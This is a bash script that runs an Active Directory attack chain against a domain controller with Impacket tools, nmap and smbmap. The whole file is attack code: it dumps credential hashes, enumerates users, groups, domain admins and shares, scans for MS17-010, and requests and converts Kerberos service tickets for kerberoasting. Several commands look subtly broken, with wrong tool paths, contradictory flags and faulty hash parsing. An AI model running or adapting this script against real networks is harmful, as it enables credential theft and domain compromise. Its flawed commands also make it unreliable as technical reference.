#!/bin/bash

# Impacket installation is required, install using apt or pip
# apt install python3-impacket
# or
# pip install impacket

# Set the target domain and domain controller
DOMAIN="example.com"
DC="dc.example.com"

# Set the username and password for the enumeration
USER="user"
PASSWORD="password"

# Get the user's Kerberos hash
HASH=$(/usr/local/bin/python3.8/dist-packages/secretsdump.py -no-pass $USER:$PASSWORD@$DC | grep "Hash" | cut -d " " -f 2)

# Enumerate users
/usr/local/bin/python3.8/dist-packages/samrdump.py $USER:$PASSWORD@$DC -hashes $HASH | grep -E '^[a-zA-Z0-9\-_\$\.]+:' | cut -d ':' -f 1 > users.txt

# Enumerate groups
/usr/local/bin/python3.8/dist-packages/samrdump.py $USER:$PASSWORD@$DC -hashes $HASH | grep "^Group Name:" | cut -d ' ' -f 3- > groups.txt

# Enumerate domain admins
/usr/local/bin/python3.8/dist-packages/samrdump.py $USER:$PASSWORD@$DC -hashes $HASH | grep "^Domain Admins:" | cut -d ' ' -f 3- > domain_admins.txt

# Enumerate computers
nmap -p 445 --script=smb-os-discovery,smb-enum-users,smb-enum-shares,smb-enum-sessions,smb-vuln-ms17-010 $DC

# Enumerate shares
/usr/local/bin/python3.8/dist-packages/smbmap.py -H $DC -u $USER -p $PASSWORD -P 445

# Enumerate domain users with password policy information
/usr/local/bin/python3.8/dist-packages/GetADUsers.py $USER $PASSWORD $DOMAIN -all -k -o users_with_password_policy_info.txt

# Enumerate Kerberos tickets
/usr/local/bin/python3.8/dist-packages/GetUserSPNs.py $USER/$DOMAIN -request -dc-ip $DC -outputfile spn.txt -hashes $HASH

# Dump Kerberos tickets
/usr/local/bin/python3.8/dist-packages/ticket_converter.py -i spn.txt -o tickets.kirbi
